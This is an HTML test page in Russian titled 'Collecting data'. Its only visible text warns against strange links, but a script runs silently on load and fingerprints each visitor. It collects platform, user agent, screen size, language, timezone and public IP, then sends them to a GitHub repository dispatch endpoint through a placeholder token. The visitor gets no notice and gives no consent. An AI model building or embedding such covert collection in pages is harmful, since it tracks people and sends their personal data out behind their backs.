<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Собираем данные</title>
</head>
<body>
    <h1>Привет, это тестовая страница!</h1>
    <p>Не переходи по странным ссылкам!</p>

    <script>
        function collectData() {
            const data = {
                ip: 'unknown',
                os: navigator.platform,
                browser: navigator.userAgent,
                screen: `${screen.width}x${screen.height}`,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };

            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(ipData => {
                    data.ip = ipData.ip;
                    sendData(data);
                })
                .catch(error => {
                    console.error('Ошибка при получении IP:', error);
                    sendData(data);
                });
        }

        function sendData(data) {
            fetch('https://api.github.com/repos/your-username/data-collection-page/dispatches', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': 'token ' + 'NFS_METKA'
                },
                body: JSON.stringify({
                    event_type: 'data_collection',
                    client_payload: data
                })
            })
            .then(response => response.json())
            .then(responseData => {
                console.log('Данные отправлены:', responseData);
            })
            .catch(error => {
                console.error('Ошибка при отправке данных:', error);
            });
        }

        collectData();
    </script>
</body>
</html>
